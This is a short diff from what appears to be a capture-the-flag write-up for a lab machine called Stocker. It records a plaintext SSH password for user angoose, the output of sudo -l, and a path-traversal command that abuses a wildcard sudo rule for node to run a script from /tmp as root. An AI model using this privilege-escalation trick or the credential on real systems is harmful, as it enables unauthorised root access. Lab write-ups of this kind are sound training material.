@@ -153,8 +153,18 @@ ssh angoose@10.10.11.196
 IHeardPassphrasesArePrettySecure
  
  
- 
- 
+
+bash-5.0$ sudo -l
+[sudo] password for angoose:
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+
+sudo /usr/bin/node /usr/local/scripts/../../../../tmp/test.js
+
+	
 
 
 
